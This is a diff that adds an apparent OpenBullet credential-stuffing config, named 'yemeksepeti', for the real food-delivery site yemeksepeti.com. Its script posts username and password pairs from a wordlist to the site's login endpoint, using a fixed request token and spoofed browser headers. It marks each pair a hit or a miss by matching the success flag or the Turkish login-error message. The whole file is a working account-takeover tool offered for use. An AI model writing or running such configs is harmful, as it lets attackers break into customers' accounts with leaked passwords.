@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "yemeksepeti",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-05T21:56:44.2056062+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.yemeksepeti.com/en/login" 
+  CONTENT "{\"ysRequest\":{\"Token\":\"5214b7efd9a240639d734c46bfc3b740\",\"CatalogName\":\"TR_ISTANBUL\",\"Culture\":\"en-US\",\"LanguageId\":\"en-US\"},\"UserName\":\"<USER>\",\"Password\":\"<PASS>\",\"RememberMe\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.yemeksepeti.com" 
+  HEADER "Origin: https://www.yemeksepeti.com" 
+  HEADER "Referer: https://www.yemeksepeti.com/en/istanbul" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY ",\"IsSuccess\":true" 
+  KEYCHAIN Failure OR 
+    KEY "Hatalı giriş." 
